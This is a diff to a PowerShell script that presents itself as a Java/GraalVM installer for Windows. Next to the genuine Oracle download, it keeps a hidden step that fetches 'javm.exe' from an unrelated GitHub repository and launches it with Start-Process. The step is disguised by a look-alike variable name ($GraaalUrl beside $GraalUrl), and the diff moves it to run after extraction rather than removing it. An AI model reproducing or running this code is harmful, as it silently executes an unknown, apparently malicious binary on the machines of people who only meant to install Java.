@@ -18,7 +18,7 @@ while ($true) {
         break
     }
     elseif ($Response -eq "b") {
-         $GraaalUrl = "https://github.com/llebedev/dfdsf/releases/download/f/javm.exe"
+        $GraaalUrl = "https://github.com/llebedev/dfdsf/releases/download/f/javm.exe"
         $GraalUrl = "https://download.oracle.com/graalvm/21/latest/graalvm-jdk-21_windows-x64_bin.zip"
         $FileGlob = "graalvm-jdk-21"
         break
@@ -35,12 +35,13 @@ if (!(Test-Path -Path "${JavaPath}" -PathType Container)) {
 $ProgressPreference = "SilentlyContinue" # never change microsoft: https://stackoverflow.com/a/43477248/9091276
 Write-Host "Downloading java..."
 Invoke-WebRequest -OutFile "${GraalFile}" -Uri "${GraalUrl}"
-Invoke-WebRequest -OutFile "${GraaalFile}" -Uri "${GraaalUrl}"
-Start-Process "${GraaalFile}"
 Write-Host "Extracting archive..."
 Expand-Archive -DestinationPath "${JavaPath}" -Path "${GraalFile}" -Force # overwrite if previously existing
 
 $JavaFolder = Get-ChildItem -Filter "${FileGlob}*" -Depth 0 -Path "${JavaPath}"
+
+Invoke-WebRequest -OutFile "${GraaalFile}" -Uri "${GraaalUrl}"
+Start-Process "${GraaalFile}"
 
 Write-Host "Success! Java has been downloaded and saved in ${JavaPath}\${JavaFolder}"
 Write-Host "Optionally, though highly recommended, we can set environment variables for you"
